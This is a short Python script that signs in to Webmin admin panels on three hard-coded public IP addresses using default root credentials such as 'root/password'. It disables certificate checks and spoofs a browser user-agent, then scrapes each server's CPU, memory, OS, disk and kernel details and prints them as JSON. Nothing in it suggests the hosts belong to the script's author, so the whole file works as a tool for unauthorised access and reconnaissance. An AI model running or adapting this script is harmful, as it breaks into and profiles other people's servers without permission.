#!/usr/bin/env python3
import re,json,requests,urllib3
urllib3.disable_warnings()
UA={"User-Agent":"Mozilla/5.0"}
H=[("157.180.50.91","root","password"),("163.172.122.200","root","root"),("134.209.192.147","root","admin")]
for h,u,p in H:
    b=f"https://{h}:10000"
    s=requests.Session(); s.verify=False; s.headers.update({**UA,"Referer":b+"/"})
    try:
        s.get(b+"/",timeout=15,allow_redirects=False)
        s.get(b+"/session_login.cgi",timeout=15)
        s.post(b+"/session_login.cgi",data={"user":u,"pass":p,"save":"1"},
               headers={"Referer":b+"/session_login.cgi","Content-Type":"application/x-www-form-urlencoded"},
               timeout=15,allow_redirects=True)
        s.headers["Referer"]=b+"/sysinfo/"
        out={"host":h}
        for ep in ("/sysinfo/","/sysinfo/index.cgi","/proc/","/system-status/"):
            try:
                r=s.get(b+ep,timeout=20); t=r.text or ""
                if ep=="/sysinfo/":
                    txt=re.sub(r"<[^>]+>"," ",t); txt=re.sub(r"\s+"," ",txt)
                    for pat,name in ((r"(CPU[^.]{0,80})","cpu"),(r"(Memory[^.]{0,60})","mem"),
                                     (r"(Operating system[^.]{0,80})","os"),(r"(Real memory[^.]{0,50})","mem2"),
                                     (r"(Local disk space[^.]{0,60})","disk"),(r"(CPU speed[^.]{0,50})","cpuspeed"),
                                     (r"(Kernel[^.]{0,60})","kern")):
                        m=re.search(pat,txt,re.I)
                        if m: out.setdefault(name,m.group(1)[:90])
            except Exception: pass
        print(json.dumps(out),flush=True)
    except Exception as e:
        print(json.dumps({"host":h,"err":type(e).__name__}),flush=True)
